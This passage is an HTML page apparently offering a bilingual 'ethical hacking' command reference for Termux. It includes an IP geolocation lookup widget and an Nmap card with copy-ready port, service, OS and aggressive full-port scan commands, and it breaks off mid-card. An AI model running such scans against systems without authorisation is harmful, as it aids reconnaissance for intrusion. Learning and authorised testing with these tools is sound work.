@@ -1,0 +1,2471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Termux Hub — by Zayn Khan NaYem</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@400;600;700;900&family=Noto+Sans+Bengali:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070b07;--panel:#0e160e;--panel2:#091209;
+  --border:#162416;--border2:#1e361e;
+  --green:#00ff41;--green3:#003d10;--green4:#001f08;
+  --cyan:#00ffe5;--yellow:#ffe600;--red:#ff4444;
+  --orange:#ff9500;--purple:#cc88ff;--blue:#4488ff;
+  --text:#b8f0b8;--muted:#3d6b3d;--white:#e0ffe0;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Exo 2','Noto Sans Bengali',sans-serif;min-height:100vh;overflow-x:hidden;}
+body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.05) 3px,rgba(0,0,0,0.05) 4px);pointer-events:none;z-index:9998;}
+#mc{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:0.045;}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:500;background:rgba(7,11,7,0.97);border-bottom:1px solid var(--border2);backdrop-filter:blur(10px);}
+.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;gap:12px;flex-wrap:wrap;}
+.logo{display:flex;align-items:center;gap:12px;}
+.logo-box{width:46px;height:46px;background:var(--green4);border:2px solid var(--green);border-radius:10px;display:flex;align-items:center;justify-content:center;font-family:'Share Tech Mono',monospace;font-size:18px;color:var(--green);animation:gpulse 2.5s infinite;box-shadow:0 0 20px rgba(0,255,65,0.3);}
+@keyframes gpulse{0%,100%{box-shadow:0 0 20px rgba(0,255,65,0.3);}50%{box-shadow:0 0 40px rgba(0,255,65,0.7);}}
+.logo-text h1{font-family:'Share Tech Mono',monospace;font-size:20px;color:var(--green);letter-spacing:3px;text-shadow:0 0 15px rgba(0,255,65,0.5);}
+.logo-text p{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;}
+.hdr-right{display:flex;align-items:center;gap:10px;}
+.lang-wrap{display:flex;background:var(--panel);border:1px solid var(--border2);border-radius:8px;overflow:hidden;}
+.lbtn{padding:8px 18px;border:none;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;font-weight:700;background:transparent;color:var(--muted);transition:all 0.2s;letter-spacing:1px;}
+.lbtn.on{background:var(--green3);color:var(--green);}
+.tbadge{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);border:1px solid var(--cyan);padding:4px 12px;border-radius:20px;background:rgba(0,255,229,0.05);}
+
+/* TICKER */
+.ticker{background:var(--green4);border-bottom:1px solid var(--border2);padding:5px 0;overflow:hidden;}
+.tick-inner{display:flex;gap:50px;white-space:nowrap;animation:tick 50s linear infinite;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);letter-spacing:1px;}
+@keyframes tick{0%{transform:translateX(0);}100%{transform:translateX(-50%);}}
+
+/* HERO */
+.hero{position:relative;z-index:1;text-align:center;padding:50px 20px 36px;background:radial-gradient(ellipse at 50% 0%,rgba(0,80,20,0.15) 0%,transparent 70%);}
+.hero-tag{display:inline-block;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);border:1px solid rgba(0,255,229,0.4);padding:4px 16px;border-radius:20px;margin-bottom:18px;letter-spacing:3px;}
+.hero h2{font-size:clamp(26px,5vw,50px);font-weight:900;color:var(--white);margin-bottom:14px;line-height:1.1;letter-spacing:-1px;}
+.hero h2 em{color:var(--green);font-style:normal;text-shadow:0 0 30px rgba(0,255,65,0.5);}
+.hero-sub{font-size:15px;color:var(--muted);max-width:580px;margin:0 auto 28px;line-height:1.7;}
+.stats{display:flex;justify-content:center;gap:36px;flex-wrap:wrap;}
+.stat-n{font-family:'Share Tech Mono',monospace;font-size:30px;color:var(--green);text-shadow:0 0 12px rgba(0,255,65,0.4);}
+.stat-l{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-top:2px;}
+
+/* CONTROLS */
+.controls{position:relative;z-index:1;padding:0 20px 24px;}
+.search-wrap{max-width:680px;margin:0 auto 18px;position:relative;}
+.search-pre{position:absolute;left:16px;top:50%;transform:translateY(-50%);font-family:'Share Tech Mono',monospace;color:var(--green);font-size:15px;pointer-events:none;}
+.srch-inp{width:100%;background:var(--panel);border:1px solid var(--border2);border-radius:10px;padding:15px 16px 15px 42px;color:var(--white);font-family:'Share Tech Mono',monospace;font-size:14px;outline:none;transition:all 0.25s;}
+.srch-inp:focus{border-color:var(--green);box-shadow:0 0 25px rgba(0,255,65,0.12);}
+.srch-inp::placeholder{color:var(--muted);}
+.cat-scroll{overflow-x:auto;scrollbar-width:none;padding-bottom:4px;}
+.cat-scroll::-webkit-scrollbar{display:none;}
+.cats{display:flex;gap:8px;min-width:max-content;justify-content:center;}
+.cat{display:flex;align-items:center;gap:6px;padding:9px 18px;border:1px solid var(--border2);border-radius:8px;background:var(--panel);color:var(--muted);cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px;transition:all 0.2s;white-space:nowrap;}
+.cat:hover{color:var(--text);border-color:var(--muted);}
+.cat.on{background:var(--green3);border-color:var(--green);color:var(--green);}
+
+/* MAIN */
+.main{position:relative;z-index:1;padding:0 20px 60px;}
+.sec{margin-bottom:48px;}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:20px;padding:14px 20px;border-radius:10px;background:linear-gradient(90deg,var(--green4),transparent);border:1px solid var(--border2);border-left:3px solid var(--green);}
+.sec-icon{font-size:22px;}
+.sec-title{font-family:'Share Tech Mono',monospace;font-size:15px;color:var(--green);letter-spacing:2px;text-transform:uppercase;}
+.sec-sub{font-size:12px;color:var(--muted);margin-top:2px;}
+.sec-count{margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);border:1px solid var(--green3);background:var(--green4);padding:3px 10px;border-radius:20px;}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:18px;}
+
+/* CARD */
+.card{background:var(--panel);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:all 0.25s;position:relative;}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:0;transition:opacity 0.3s;}
+.card:hover{border-color:var(--border2);box-shadow:0 6px 30px rgba(0,255,65,0.1);transform:translateY(-2px);}
+.card:hover::before{opacity:1;}
+.card.hidden{display:none!important;}
+
+.card-top{display:flex;align-items:flex-start;gap:12px;padding:16px 18px 12px;}
+.tool-icon{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
+.tool-meta{flex:1;min-width:0;}
+.tool-name{font-family:'Share Tech Mono',monospace;font-size:15px;color:var(--white);font-weight:700;letter-spacing:1px;}
+.tool-desc{font-size:12px;color:var(--muted);line-height:1.5;margin-top:3px;}
+.badge{font-family:'Share Tech Mono',monospace;font-size:9px;padding:3px 9px;border-radius:20px;border:1px solid;white-space:nowrap;flex-shrink:0;align-self:flex-start;letter-spacing:1px;}
+.b-recon{color:var(--cyan);border-color:var(--cyan);background:rgba(0,255,229,0.06);}
+.b-net{color:var(--blue);border-color:var(--blue);background:rgba(68,136,255,0.06);}
+.b-web{color:var(--orange);border-color:var(--orange);background:rgba(255,149,0,0.06);}
+.b-pass{color:var(--red);border-color:var(--red);background:rgba(255,68,68,0.06);}
+.b-exploit{color:#ff6688;border-color:#ff6688;background:rgba(255,102,136,0.06);}
+.b-osint{color:var(--purple);border-color:var(--purple);background:rgba(204,136,255,0.06);}
+.b-android{color:var(--yellow);border-color:var(--yellow);background:rgba(255,230,0,0.06);}
+.b-util{color:var(--green);border-color:var(--green);background:rgba(0,255,65,0.06);}
+.b-ctf{color:#ff88aa;border-color:#ff88aa;background:rgba(255,136,170,0.06);}
+
+/* FEATURES */
+.features{margin:0 18px 12px;background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;}
+.feat-title{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px;}
+.feat-list{display:flex;flex-wrap:wrap;gap:5px;}
+.feat{font-size:10px;background:var(--green4);border:1px solid var(--border2);color:var(--text);padding:2px 9px;border-radius:20px;font-family:'Share Tech Mono',monospace;}
+
+/* INSTALL */
+.inst{margin:0 18px 10px;background:rgba(0,61,16,0.3);border:1px solid var(--green3);border-radius:6px;padding:8px 13px;display:flex;align-items:center;gap:8px;}
+.inst code{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);flex:1;word-break:break-all;}
+
+/* COMMANDS */
+.cmds{padding:0 18px 18px;}
+.cmd-lbl{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px;margin-top:8px;display:flex;align-items:center;gap:6px;}
+.cmd-lbl::after{content:'';flex:1;height:1px;background:var(--border);}
+.cmd-row{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:9px 13px;margin-bottom:5px;display:flex;align-items:flex-start;gap:8px;transition:border-color 0.2s;}
+.cmd-row:hover{border-color:var(--border2);}
+.cmd-content{flex:1;min-width:0;}
+.cmd-code{font-family:'Share Tech Mono',monospace;font-size:12px;line-height:1.5;word-break:break-all;color:var(--green);}
+.cmd-code .cb{color:var(--cyan);}
+.cmd-code .cf{color:var(--yellow);}
+.cmd-code .ca{color:var(--orange);}
+.cmd-code .cs{color:var(--purple);}
+.cmd-note{font-size:11px;color:var(--muted);margin-top:4px;line-height:1.4;}
+.cpbtn{flex-shrink:0;background:var(--green4);border:1px solid var(--border2);color:var(--muted);padding:3px 9px;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:10px;transition:all 0.2s;white-space:nowrap;}
+.cpbtn:hover{border-color:var(--green);color:var(--green);}
+.cpbtn.ok{background:var(--green);color:#000;border-color:var(--green);}
+
+/* WARN */
+.warn{background:rgba(255,149,0,0.06);border:1px solid rgba(255,149,0,0.3);border-radius:10px;padding:18px 20px;margin-bottom:28px;display:flex;gap:14px;position:relative;z-index:1;}
+.warn-icon{font-size:24px;flex-shrink:0;}
+.warn h4{color:var(--orange);font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:1px;margin-bottom:6px;}
+.warn p{font-size:12px;color:var(--muted);line-height:1.6;}
+
+/* NO RES */
+.no-res{text-align:center;padding:60px 20px;font-family:'Share Tech Mono',monospace;color:var(--muted);display:none;position:relative;z-index:1;}
+.no-res.show{display:block;}
+
+/* NOTIF */
+.notif{position:fixed;bottom:24px;right:24px;z-index:9999;background:var(--green3);border:1px solid var(--green);color:var(--green);padding:10px 22px;border-radius:8px;font-family:'Share Tech Mono',monospace;font-size:12px;box-shadow:0 0 24px rgba(0,255,65,0.3);opacity:0;transform:translateY(8px);transition:all 0.3s;pointer-events:none;}
+.notif.show{opacity:1;transform:translateY(0);}
+
+footer{position:relative;z-index:1;border-top:1px solid var(--border2);padding:28px 20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:1px;}
+footer em{color:var(--green);font-style:normal;}
+
+@media(max-width:600px){
+  .grid{grid-template-columns:1fr;}
+  .hero h2{font-size:26px;}
+  .logo-text h1{font-size:16px;}
+  .main{padding:0 12px 50px;}
+  .controls{padding:0 12px 20px;}
+}
+
+body.en .bn{display:none!important;}
+body.bn .en{display:none!important;}
+</style>
+</head>
+<body class="en">
+<canvas id="mc"></canvas>
+
+<!-- HEADER -->
+<header>
+  <div style="background:linear-gradient(90deg,var(--green4),transparent,var(--green4));border-bottom:1px solid var(--green3);padding:5px 20px;display:flex;align-items:center;justify-content:center;gap:8px;"><span style="font-size:12px;">👨‍💻</span><span style="font-family:Share Tech Mono,monospace;font-size:11px;color:var(--muted);letter-spacing:2px;">DEVELOPED BY</span><span style="font-family:Share Tech Mono,monospace;font-size:14px;color:var(--green);font-weight:700;letter-spacing:3px;text-shadow:0 0 10px rgba(0,255,65,0.6);">Zayn Khan NaYem</span><span style="font-size:12px;">⚡</span></div><div class="hdr">
+    <div class="logo">
+      <div class="logo-box">$_</div>
+      <div class="logo-text">
+        <h1>TERMUX HUB</h1>
+        <p class="en">COMPLETE ETHICAL HACKING TOOLKIT</p>
+        <p class="bn">সম্পূর্ণ ইথিক্যাল হ্যাকিং টুলকিট</p>
+      </div>
+    </div>
+    <div class="hdr-right">
+      <div class="tbadge">40+ TOOLS</div>
+      <div class="lang-wrap">
+        <button class="lbtn on" id="lben" onclick="setL('en')">EN</button>
+        <button class="lbtn" id="lbbn" onclick="setL('bn')">বাং</button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="tick-inner" id="ticker-inner"></div>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag en">// TERMUX COMPLETE REFERENCE v3.0 — 40+ TOOLS</div>
+  <div class="hero-tag bn">// টার্মাক্স সম্পূর্ণ রেফারেন্স v3.0 — ৪০+ টুলস</div>
+  <h2 class="en">Every Termux Tool.<br><em>Every Command.</em></h2>
+  <h2 class="bn">প্রতিটি Termux টুল।<br><em>প্রতিটি কমান্ড।</em></h2>
+  <p class="hero-sub en">40+ tools — Recon, Network, Web, Password, Exploitation, OSINT, Android, Automation & CTF. Copy-ready commands for beginners.</p>
+  <p class="hero-sub bn">৪০+ টুলস — Recon, Network, Web, Password, Exploitation, OSINT, Android, Automation ও CTF। নতুনদের জন্য কপি-রেডি কমান্ড।</p>
+  <div class="stats">
+    <div><div class="stat-n">40+</div><div class="stat-l en">TOOLS</div><div class="stat-l bn">টুলস</div></div>
+    <div><div class="stat-n">120+</div><div class="stat-l en">COMMANDS</div><div class="stat-l bn">কমান্ড</div></div>
+    <div><div class="stat-n">9</div><div class="stat-l en">CATEGORIES</div><div class="stat-l bn">ক্যাটাগরি</div></div>
+    <div><div class="stat-n">2</div><div class="stat-l en">LANGUAGES</div><div class="stat-l bn">ভাষা</div></div>
+  </div>
+</div>
+
+<!-- CONTROLS -->
+<div class="controls">
+  <div class="search-wrap">
+    <span class="search-pre">$&gt;</span>
+    <input class="srch-inp" id="srch" type="text" placeholder="Search tools & commands..." oninput="doFilter()">
+  </div>
+  <div class="cat-scroll">
+    <div class="cats">
+      <div class="cat on" data-cat="all" onclick="setCat(this)">🔥 <span class="en">All</span><span class="bn">সব</span></div>
+      <div class="cat" data-cat="recon" onclick="setCat(this)">🔎 <span class="en">Recon</span><span class="bn">রিকন</span></div>
+      <div class="cat" data-cat="network" onclick="setCat(this)">📡 <span class="en">Network</span><span class="bn">নেটওয়ার্ক</span></div>
+      <div class="cat" data-cat="web" onclick="setCat(this)">🌐 <span class="en">Web</span><span class="bn">ওয়েব</span></div>
+      <div class="cat" data-cat="password" onclick="setCat(this)">🔑 <span class="en">Password</span><span class="bn">পাসওয়ার্ড</span></div>
+      <div class="cat" data-cat="exploit" onclick="setCat(this)">💣 <span class="en">Exploit</span><span class="bn">এক্সপ্লয়েট</span></div>
+      <div class="cat" data-cat="osint" onclick="setCat(this)">🕵️ OSINT</div>
+      <div class="cat" data-cat="android" onclick="setCat(this)">📱 Android</div>
+      <div class="cat" data-cat="util" onclick="setCat(this)">⚙️ <span class="en">Utility</span><span class="bn">ইউটিলিটি</span></div>
+      <div class="cat" data-cat="ctf" onclick="setCat(this)">🏁 CTF</div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN -->
+<div class="main" id="main">
+
+  <!-- WARNING -->
+  <div class="warn">
+    <div class="warn-icon">⚠️</div>
+    <div>
+      <h4 class="en">EDUCATIONAL & ETHICAL USE ONLY</h4>
+      <h4 class="bn">শুধুমাত্র শিক্ষামূলক ও নৈতিক ব্যবহার</h4>
+      <p class="en">These tools are for authorized penetration testing & learning only. Never use on systems you don't own or have written permission to test. Unauthorized access is illegal.</p>
+      <p class="bn">এই টুলসগুলো শুধুমাত্র অনুমোদিত পেনিট্রেশন টেস্টিং ও শেখার জন্য। নিজের বা লিখিত অনুমতিপ্রাপ্ত সিস্টেমে ছাড়া ব্যবহার করবেন না। অননুমোদিত অ্যাক্সেস বেআইনি।</p>
+    </div>
+  </div>
+
+
+  <!-- IP LOOKUP TOOL -->
+  <div style="position:relative;z-index:1;background:var(--panel);border:1px solid var(--border2);border-radius:14px;padding:24px;margin-bottom:28px;">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px;">
+      <div style="font-size:22px;">🌐</div>
+      <div style="flex:1;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:15px;color:var(--green);letter-spacing:2px;text-transform:uppercase;">IP Address Info Lookup</div>
+        <div style="font-size:12px;color:var(--muted);margin-top:2px;" class="en">Get country, city, ISP & approximate location of any IP</div>
+        <div style="font-size:12px;color:var(--muted);margin-top:2px;" class="bn">যেকোনো IP-এর দেশ, শহর, ISP ও আনুমানিক লোকেশন দেখুন</div>
+      </div>
+      <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--cyan);border:1px solid var(--cyan);padding:3px 10px;border-radius:20px;background:rgba(0,255,229,0.05);">PUBLIC API</span>
+    </div>
+    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;">
+      <div style="position:relative;flex:1;min-width:200px;">
+        <span style="position:absolute;left:14px;top:50%;transform:translateY(-50%);font-family:'Share Tech Mono',monospace;color:var(--green);font-size:14px;pointer-events:none;">$</span>
+        <input id="ip-input" type="text" placeholder="Enter IP (e.g. 8.8.8.8) or leave blank for your IP"
+          style="width:100%;background:var(--panel2);border:1px solid var(--border2);border-radius:8px;padding:12px 14px 12px 32px;color:var(--white);font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;transition:border-color 0.2s;"
+          onfocus="this.style.borderColor='var(--green)'" onblur="this.style.borderColor='var(--border2)'"
+          onkeydown="if(event.key==='Enter')lookupIP()">
+      </div>
+      <button onclick="lookupIP()"
+        style="background:var(--green3);border:1px solid var(--green);color:var(--green);padding:12px 24px;border-radius:8px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;font-weight:700;letter-spacing:1px;transition:all 0.2s;white-space:nowrap;"
+        onmouseover="this.style.background='var(--green)';this.style.color='#000'"
+        onmouseout="this.style.background='var(--green3)';this.style.color='var(--green)'">
+        🔍 LOOKUP
+      </button>
+      <button onclick="lookupMyIP()"
+        style="background:var(--panel2);border:1px solid var(--border2);color:var(--muted);padding:12px 20px;border-radius:8px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:12px;transition:all 0.2s;white-space:nowrap;"
+        onmouseover="this.style.borderColor='var(--cyan)';this.style.color='var(--cyan)'"
+        onmouseout="this.style.borderColor='var(--border2)';this.style.color='var(--muted)'">
+        📡 MY IP
+      </button>
+    </div>
+    <!-- RESULT BOX -->
+    <div id="ip-result" style="display:none;">
+      <div style="background:var(--panel2);border:1px solid var(--border);border-radius:10px;overflow:hidden;">
+        <div id="ip-loading" style="padding:24px;text-align:center;font-family:'Share Tech Mono',monospace;color:var(--muted);font-size:13px;display:none;">
+          <div style="color:var(--green);font-size:20px;margin-bottom:8px;animation:spin 1s linear infinite;display:inline-block;">⟳</div><br>FETCHING DATA...
+        </div>
+        <div id="ip-data" style="display:none;">
+          <!-- TOP BAR -->
+          <div style="background:var(--green4);border-bottom:1px solid var(--border);padding:14px 18px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+            <span id="ip-flag" style="font-size:26px;"></span>
+            <div>
+              <div id="ip-address-show" style="font-family:'Share Tech Mono',monospace;font-size:17px;color:var(--green);font-weight:700;text-shadow:0 0 10px rgba(0,255,65,0.4);"></div>
+              <div id="ip-hostname" style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);margin-top:2px;"></div>
+            </div>
+            <span id="ip-type-badge" style="margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:9px;padding:3px 10px;border-radius:20px;border:1px solid var(--cyan);color:var(--cyan);background:rgba(0,255,229,0.06);"></span>
+          </div>
+          <!-- INFO GRID -->
+          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));">
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">🌍 COUNTRY</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">🌍 দেশ</div>
+              <div id="r-country" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">🏙️ CITY</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">🏙️ শহর</div>
+              <div id="r-city" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">🗺️ REGION</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">🗺️ অঞ্চল</div>
+              <div id="r-region" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">🕐 TIMEZONE</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">🕐 টাইমজোন</div>
+              <div id="r-timezone" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">📡 ISP / ORG</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">📡 ISP / অর্গ</div>
+              <div id="r-org" style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">📮 POSTAL CODE</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">📮 পোস্টাল কোড</div>
+              <div id="r-postal" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--white);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">📍 LATITUDE</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">📍 অক্ষাংশ</div>
+              <div id="r-lat" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--cyan);font-weight:600;"></div>
+            </div>
+            <div style="padding:12px 18px;border-bottom:1px solid var(--border);border-right:1px solid var(--border);">
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="en">📍 LONGITUDE</div>
+              <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:5px;" class="bn">📍 দ্রাঘিমাংশ</div>
+              <div id="r-lon" style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--cyan);font-weight:600;"></div>
+            </div>
+          </div>
+          <!-- ACTIONS -->
+          <div style="padding:14px 18px;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+            <a id="map-link" href="#" target="_blank"
+              style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);border:1px solid var(--cyan);padding:7px 16px;border-radius:6px;text-decoration:none;background:rgba(0,255,229,0.05);transition:all 0.2s;">
+              🗺️ VIEW ON MAP
+            </a>
+            <button onclick="copyIPResult()"
+              style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);border:1px solid var(--border2);padding:7px 16px;border-radius:6px;background:transparent;cursor:pointer;transition:all 0.2s;"
+              onmouseover="this.style.color='var(--green)';this.style.borderColor='var(--green)'"
+              onmouseout="this.style.color='var(--muted)';this.style.borderColor='var(--border2)'">
+              📋 COPY INFO
+            </button>
+            <span style="margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);" class="en">⚠️ Approximate location only</span>
+            <span style="margin-left:auto;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);" class="bn">⚠️ শুধু আনুমানিক লোকেশন</span>
+          </div>
+        </div>
+        <div id="ip-error" style="display:none;padding:24px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--red);">
+          ❌ <span id="ip-err-msg"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       1. INFORMATION GATHERING / RECON
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="recon">
+    <div class="sec-head">
+      <div class="sec-icon">🔎</div>
+      <div>
+        <div class="sec-title en">Information Gathering / Recon</div>
+        <div class="sec-title bn">তথ্য সংগ্রহ / রিকন</div>
+        <div class="sec-sub en">Discover hosts, domains, emails & digital footprints</div>
+        <div class="sec-sub bn">হোস্ট, ডোমেইন, ইমেইল ও ডিজিটাল ট্রেস খুঁজে বের করুন</div>
+      </div>
+      <div class="sec-count">6 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- NMAP -->
+      <div class="card" data-cat="recon" data-kw="nmap port scanner network">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a2a;border:1px solid var(--cyan);">📡</div>
+          <div class="tool-meta">
+            <div class="tool-name">Nmap</div>
+            <div class="tool-desc en">Network mapper — scan ports, detect services & OS versions</div>
+            <div class="tool-desc bn">নেটওয়ার্ক ম্যাপার — পোর্ট স্ক্যান, সার্ভিস ও OS ডিটেক্ট করুন</div>
+          </div>
+          <span class="badge b-recon">RECON</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Nmap</div>
+          <div class="feat-title bn">✦ Nmap দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Port Scanning</span><span class="feat bn">পোর্ট স্ক্যান</span>
+            <span class="feat en">OS Detection</span><span class="feat bn">OS শনাক্ত</span>
+            <span class="feat en">Service Version</span><span class="feat bn">সার্ভিস ভার্শন</span>
+            <span class="feat en">Network Discovery</span><span class="feat bn">নেটওয়ার্ক আবিষ্কার</span>
+            <span class="feat en">Firewall Detection</span><span class="feat bn">ফায়ারওয়াল ডিটেক্ট</span>
+            <span class="feat en">Vulnerability Scripts</span><span class="feat bn">ভালনারেবিলিটি স্ক্রিপ্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">nmap</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install nmap')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nmap</span> <span class="ca">192.168.1.1</span></div>
+            <div class="cmd-note en">Basic scan — shows all open ports of a host</div>
+            <div class="cmd-note bn">বেসিক স্ক্যান — হোস্টের খোলা পোর্ট দেখায়</div>
+          </div><button class="cpbtn" onclick="cp(this,'nmap 192.168.1.1')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nmap</span> <span class="cf">-sV -O</span> <span class="ca">192.168.1.0/24</span></div>
+            <div class="cmd-note en">Detect service versions & OS on entire subnet</div>
+            <div class="cmd-note bn">পুরো সাবনেটে সার্ভিস ভার্শন ও OS ডিটেক্ট</div>
+          </div><button class="cpbtn" onclick="cp(this,'nmap -sV -O 192.168.1.0/24')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nmap</span> <span class="cf">-A -T4 -p-</span> <span class="ca">target.com</span></div>
+            <div class="cmd-note en">Full aggressive scan — all 65535 ports + scripts + traceroute</div>
+            <div class="cmd-note bn">ফুল অ্যাগ্রেসিভ স্ক্যান — সব পোর্ট + স্ক্রিপ্ট + ট্রেসরুট</div>
+          </div><button class="cpbtn" onclick="cp(this,'nmap -A -T4 -p- target.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
